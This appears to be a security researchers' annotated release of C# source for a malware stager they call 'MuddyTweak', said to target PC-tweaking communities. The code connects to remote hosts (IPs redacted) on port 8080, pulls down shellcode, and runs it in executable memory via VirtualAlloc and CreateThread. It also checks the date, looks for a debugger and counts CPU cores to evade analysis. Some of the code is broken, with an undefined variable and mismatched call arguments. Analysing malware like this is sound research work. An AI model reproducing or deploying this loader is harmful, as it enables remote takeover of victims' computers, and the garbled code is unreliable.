// After a few days that we decided to take a part and fight back the attackers, we decided to share out findings due of our new equation, here's what we know so far, feel free if let us know if you found something.
// More context on the malware can be found at this PDF file here: https://drive.google.com/file/d/17cYgkVAEDzV2LhTuF2WSt2h9F2TZtbii/view?usp=sharing, and as well as on our Twitter: @SIRAAnalyses
// We decided to call the malware "MuddyTweak" because the attackers only used this malware against "Tweaking Communities", communities that people are optimizing their computer to get better performance out of their hardware, or in a short word "tweaking".
// THE MALWARE WON'T WORK FOR A PURPOSE, WE DO NOT HAVE ANY RESPONSIBILITY IN MISUSE, WE'VE SHARED IT FOR ONLY ONE REASON, EDU PURPOSES AND RESEARCH


using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading;
namespace sailPecBwRo { class NMKdsVcPngaKS {
static byte[] skKFSkknxZi2(string cqaeSYWAU, int eEQaOJC) {
    IPEndPoint qVnYkdLWtdOUV = new IPEndPoint(IPAddress.Parse(cqaeSYWAU), eEQaOJC);
    Socket OOXHEW = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); // Here, the hackers were using the socket extension (which is mostly what you use to connect between two computers, servers and such.), from a first look they used the protocol TCP, the attackers tried to confused the code but not fully, they started by setting random variables, for example the variable here for the socket is "OOXHEW"
    try { OOXHEW.Connect(qVnYkdLWtdOUV); }
    catch { return null;}
    byte[] kKXmDnvUB = new byte[4];
    OOXHEW.Receive(kKXmDnvUB, 4, 0);
    int WzPpiXlbqaIha = BitConverter.ToInt32(kKXmDnvUB, 0);
    byte[] roirhsxnhtpinu = new byte[WzPpiXlbqaIha + 5];
    int TCZxhEdeWw = 0;
    while (TCZxhEdeWw < WzPpiXlbqaIha)
    { TCZxhEdeWw += OOXHEW.Receive(roirhsxnhtpinu, TCZxhEdeWw + 5, (WzPpiXlbqaIha - TCZxhEdeWw) < 4096 ? (WzPpiXlbqaIha - TCZxhEdeWw) : 4096, 0);}
    byte[] pXUxmqDQHREqzr = BitConverter.GetBytes((int)OOXHEW.Handle);
    Array.Copy(pXUxmqDQHREqzr, 0, roirhsxnhtpinu, 1, 4); roirhsxnhtpinu[0] = 0xBF;
    return roirhsxnhtpinu;}
static void OdKdhiXlGPR(byte[] aLqrQtxWyqyjNa) {
    if (aLqrQtxWyqyjNa != null) {
        UInt32 WMJEENzUpHTofv = VirtualAlloc(0, (UInt32)aLqrQtxWyqyjNa.Length, 0x1000, 0x40);
        Marshal.Copy(aLqrQtxWyqyjNa, 0, (IntPtr)(WMJEENzUpHTofv), aLqrQtxWyqyjNa.Length);
        IntPtr DZMOxMok = IntPtr.Zero;
        UInt32 DcoGzjJYxpQ = 0;
        IntPtr MOuefoffupU = IntPtr.Zero;
        DZMOxMok = CreateThread(0, 0, WMJEENzUpHTofv, MOuefoffupU, 0, ref DcoGzjJYxpQ);
        WaitForSingleObject(DZMOxMok, 0xFFFFFFFF); }}
static void Main(){
DateTime timetodaybe = DateTime.Today; // The malware checks the date time for today
DateTime daysremove = HVxTSglIFVwtn.AddDays(7); // Then it scheduled the expired days for 7, the malware doesn't seem like it will delete itself, it will probably won't work anymore, see code below for more info.
if (timetodaybe < HVxTSglIFVwtn) { // Checks the date of today, and checks how much days left for the malware to be able to be executable
	if (!System.Diagnostics.Debugger.IsAttached) { // Checks for a debugger
		if (System.Environment.ProcessorCount >= 4) { // Checks for the amount of the processor cores, if the ProcessorCount is 4, the malware is able to be executable
    byte[] RNvLOoDB = null; RNvLOoDB = skKFSkknxZi2("...............","...............","...............", 8080); // If the malware has the date of today and the expired days is 7 and the malware didn't pass the 7 days, and it didn't found debugger and the system has 4 cores, it will finally reverse back the connection between the attackers and the victim's computer through the port 8080.. in the "...............", there was 3 Iranian IP addresses that we decided the delete them from the code and saving them in an encrypted file for research purposes.
    OdKdhiXlGPR(RNvLOoDB); }
			}		}	}		[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 eRkLRnoUyECRK,UInt32 TlhExnCaUl, UInt32 UPTQkQaRYpvFmy, UInt32 XqatXXbrjyn); // under investigation
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 FJpLuzkoyfskMZ, UInt32 VifInBwDp, UInt32 ljokpRa,IntPtr GoDZoqyUSELHJ, UInt32 lAsryPdz, ref UInt32 XHcWfufDkERo); // under investigation
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr AAVEGir, UInt32 ariogp);}} // under investigation
